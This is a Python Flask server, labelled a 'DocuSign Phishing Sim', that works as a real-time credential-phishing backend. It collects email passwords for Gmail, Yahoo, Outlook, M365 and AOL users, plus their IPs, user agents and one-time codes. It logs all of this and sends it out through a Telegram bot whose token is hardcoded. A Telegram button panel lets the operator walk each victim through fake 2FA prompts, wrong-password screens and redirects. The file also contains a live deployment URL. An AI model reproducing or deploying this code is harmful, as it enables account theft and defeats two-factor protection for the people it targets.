#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API (Webhook Mode)
Deploy on Render — Pure requests-based Telegram integration, no async deps
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify
import requests as http_req

# ─── CONFIG ───
TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"

API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

app = Flask(__name__)

# Thread-safe session storage (in-memory — REQUIRES single worker!)
gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


# ─── TELEGRAM HELPERS (pure requests, no async issues) ───
def tg_send_message(text, reply_markup=None, parse_mode=None):
    """Send a Telegram message via direct API call."""
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
        result = r.json()
        if result.get("ok"):
            msg_id = result["result"]["message_id"]
            logger.info(f"✅ TG sent: msg_id={msg_id}, preview={text[:60]}...")
            return msg_id
        else:
            logger.error(f"❌ TG send failed: {result}")
            return None
    except Exception as e:
        logger.error(f"❌ TG send error: {e}", exc_info=True)
        return None


def tg_edit_message(message_id, text, reply_markup=None, parse_mode=None):
    """Edit an existing Telegram message."""
    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
        result = r.json()
        if not result.get("ok"):
            logger.warning(f"⚠️ TG edit warning: {result}")
        return result.get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG edit error: {e}", exc_info=True)
        return False


def tg_edit_reply_markup(message_id, reply_markup):
    """Edit only the reply markup of a message."""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "message_id": message_id,
        "reply_markup": json.dumps(reply_markup)
    }
    try:
        r = http_req.post(f"{API_BASE}/editMessageReplyMarkup", json=payload, timeout=15)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG edit markup error: {e}")
        return False


def tg_answer_callback(callback_query_id):
    """Answer a callback query (removes loading state on button)."""
    try:
        r = http_req.post(f"{API_BASE}/answerCallbackQuery",
                          json={"callback_query_id": callback_query_id}, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG answer callback error: {e}")
        return False


def tg_send_or_edit(message_id, text, reply_markup=None, parse_mode=None):
    """Send if no message_id, edit if exists."""
    if message_id:
        return tg_edit_message(message_id, text, reply_markup, parse_mode)
    return tg_send_message(text, reply_markup, parse_mode)


# ─── INLINE KEYBOARD BUILDER ───
def inline_kb(rows):
    """Build inline keyboard markup dict."""
    return {"inline_keyboard": rows}


def btn(text, callback_data):
    """Single inline button."""
    return {"text": text, "callback_data": callback_data}


# ─── TELEGRAM WEBHOOK ───
@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    """Telegram pushes updates here"""
    try:
        data = request.get_json(force=True)
        logger.info(f"Webhook received: update_id={data.get('update_id')}, keys={list(data.keys())}")

        if "callback_query" in data:
            logger.info(f"Callback query: {data['callback_query'].get('data','')[:100]}")
            handle_cb(data["callback_query"])
        elif "message" in data:
            logger.info(f"Message: {data['message'].get('text','')[:100]}")
            handle_msg(data["message"])
        else:
            logger.warning(f"Unknown update type: {list(data.keys())}")

        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return jsonify({"ok": False}), 500


def handle_msg(msg_data):
    """Handle regular messages"""
    chat_id = msg_data.get("chat", {}).get("id")
    text = msg_data.get("text", "")

    if str(chat_id) != TELEGRAM_CHAT_ID:
        logger.warning(f"Message from unknown chat: {chat_id}")
        return

    if text == "/status":
        with gmail_sessions_lock:
            active = [s for s in gmail_sessions.values() if s.get("action") not in ("success", "cancelled")]
        if not active:
            tg_send_message("No active Gmail sessions.")
        else:
            lines = [f"Active: {len(active)}"]
            for s in active:
                lines.append(f"• {s['email']} — stage: {s.get('stage','?')}")
            tg_send_message("\n".join(lines))
    elif text == "/id":
        tg_send_message(f"Chat ID: {chat_id}")
    elif text == "/webhook_info":
        try:
            r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
            info = r.json().get("result", {})
            tg_send_message(
                f"Webhook URL: {info.get('url','N/A')}\n"
                f"Pending: {info.get('pending_update_count','?')}\n"
                f"Allowed updates: {info.get('allowed_updates','N/A')}\n"
                f"Last error: {info.get('last_error_message','None')}\n"
                f"Last error date: {info.get('last_error_date','N/A')}"
            )
        except Exception as e:
            tg_send_message(f"Error: {e}")


def handle_cb(query):
    """Handle button presses"""
    cb_data = query["data"]
    mid = query["message"]["message_id"]
    cq_id = query["id"]

    try:
        tg_answer_callback(cq_id)

        if cb_data.startswith("yes:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found (expired or worker mismatch)")
                    return
                s = gmail_sessions[sid]
                s["action"] = "2fa_grid"
                s["stage"] = "awaiting_2fa"
                # Build 2FA grid (10-99)
                kb_rows = []
                row = []
                for i in range(10, 100):
                    row.append(btn(str(i), f"2fa:{sid}:{i}"))
                    if len(row) == 9:
                        kb_rows.append(row)
                        row = []
                if row:
                    kb_rows.append(row)
                kb_rows.append([btn("❌ Cancel", f"cancel:{sid}")])
                markup = inline_kb(kb_rows)
                tg_edit_message(mid, "🔐 Select 2FA phone number ending:", markup)

        elif cb_data.startswith("2fa:"):
            parts = cb_data.split(":")
            sid, digit = parts[1], parts[2]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                s = gmail_sessions[sid]
                s["phone"] = digit
                s["action"] = "show_prompt"
                s["stage"] = "prompt_shown"
                markup = inline_kb([[btn("✅ User Authorized", f"authorized:{sid}")]])
                tg_edit_message(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user. Waiting for 'Authorized' click...", markup)

        elif cb_data.startswith("authorized:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                s = gmail_sessions[sid]
                code1 = f"{random.randint(100000, 999999)}"
                s["sms1"] = code1
                s["action"] = "sms1"
                s["stage"] = "sms1"
                markup = inline_kb([
                    [btn("📱 Send SMS II", f"sms2:{sid}")],
                    [btn("🔄 Resend SMS I", f"resend1:{sid}")]
                ])
                tg_edit_message(mid, f"📱 SMS Code I: `{code1}`\n\nSend SMS Code II?", markup, parse_mode="Markdown")

        elif cb_data.startswith("sms2:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                s = gmail_sessions[sid]
                code2 = f"{random.randint(100000, 999999)}"
                s["sms2"] = code2
                s["action"] = "sms2"
                s["stage"] = "sms2"
                markup = inline_kb([[btn("✅ Complete", f"success:{sid}")]])
                tg_edit_message(mid, f"📱 SMS Code II: `{code2}`\n\nBoth sent. Complete?", markup, parse_mode="Markdown")

        elif cb_data.startswith("resend1:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                c = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms1"] = c
                tg_send_message(f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")

        elif cb_data.startswith("success:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                s = gmail_sessions[sid]
                s["action"] = "success"
                s["stage"] = "done"
                tg_edit_message(mid,
                    f"✅ COMPLETE — {s['email']}\n\n"
                    f"Email: {s['email']}\nPassword: {s['password']}\n"
                    f"Phone: ••••{s.get('phone','N/A')}\n"
                    f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")

        elif cb_data.startswith("cancel:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "cancelled"
                    gmail_sessions[sid]["stage"] = "cancelled"
                tg_edit_message(mid, "❌ Session cancelled.")

        elif cb_data.startswith("pw_error:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "pw_error"
                    gmail_sessions[sid]["stage"] = "pw_error"
                tg_edit_message(mid, "🔑 Showing 'Wrong Password'.")

        elif cb_data.startswith("no:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "denied"
                    gmail_sessions[sid]["stage"] = "denied"
                tg_edit_message(mid, "❌ Access Denied — user redirected.")

    except Exception as e:
        logger.error(f"CB error: {e}", exc_info=True)


# ─── API ───
@app.route("/")
def health():
    with gmail_sessions_lock:
        count = len(gmail_sessions)
    return jsonify({"status": "ok", "sessions": count})


@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    """Manually set webhook (call once after deploy)."""
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400

    webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"

    try:
        # Step 1: Delete existing webhook
        del_resp = http_req.get(f"{API_BASE}/deleteWebhook",
                                params={"drop_pending_updates": True}, timeout=15)
        logger.info(f"Delete webhook: {del_resp.json()}")

        # Step 2: Set new webhook with allowed_updates
        set_resp = http_req.post(f"{API_BASE}/setWebhook", json={
            "url": webhook_url,
            "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True,
            "max_connections": 40
        }, timeout=15)
        logger.info(f"Set webhook: {set_resp.json()}")

        # Step 3: Verify
        time.sleep(2)
        info_resp = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15)
        info = info_resp.json().get("result", info_resp.json())

        return jsonify({
            "delete_result": del_resp.json(),
            "set_result": set_resp.json(),
            "webhook_url": webhook_url,
            "webhook_info": info
        })

    except Exception as e:
        logger.error(f"Webhook setup error: {e}", exc_info=True)
        return jsonify({"error": str(e)}), 500


@app.route("/api/creds", methods=["POST"])
def capture():
    """Universal credential capture endpoint"""
    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "unknown")

    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]

    # Log
    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"Captured creds: {provider} / {email} / session={session_id}")

    # ── Telegram ──
    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[session_id] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None
            }

        # Credential drop
        tg_send_message(
            f"[+]___ Invitation Card (GMAIL) ___[+]\n"
            f"You have a new website form submission \n"
            f"IP Address: {ip}\n"
            f"Id: gmail\n"
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"UA: {ua}"
        )

        # Control panel
        tg_send_message(
            f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
            reply_markup=inline_kb([
                [btn("✅ Yes", f"yes:{session_id}"), btn("❌ No", f"no:{session_id}")],
                [btn("🔑 Password Error", f"pw_error:{session_id}")]
            ])
        )

        return jsonify({"session": session_id, "action": "waiting"})

    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg_send_message(
            f"[+]___ Invitation Card ___[+]\n"
            f"You have a new website form submission \n"
            f"IP Address: {ip}\n"
            f"Id: {pid}\n"
            f"Email: {email}\n"
            f"Password: {password}"
        )
        return jsonify({"session": session_id, "action": "check_provider"})


@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    """Gmail: frontend polls this"""
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")

    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "show_prompt":
        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action in ("cancelled", "redirect"):
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    return jsonify({"action": "waiting"})


@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    with gmail_sessions_lock:
        if session_id in gmail_sessions:
            gmail_sessions[session_id]["action"] = "authorized"
            email = gmail_sessions[session_id]["email"]
            tg_send_message(f"✅ User clicked 'Authorized' for {email}")
        else:
            return jsonify({"status": "error", "message": "session not found"}), 404
    return jsonify({"status": "ok"})


@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = request.remote_addr

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"OTP captured: {provider} / {otp} / session={session_id}")

    tg_send_message(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")

    return jsonify({"status": "ok"})


# ─── START ───
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask on 0.0.0.0:{port}")
    logger.info(f"After deploy, run:")
    logger.info(f"  curl -X POST https://docusign-unx3.onrender.com/setup_webhook -H 'Content-Type: application/json' -d '{{\"url\": \"https://docusign-unx3.onrender.com\"}}'")
    logger.info(f"IMPORTANT: Procfile must be: web: gunicorn server:app --workers=1 --bind 0.0.0.0:$PORT")
    app.run(host="0.0.0.0", port=port, debug=False)
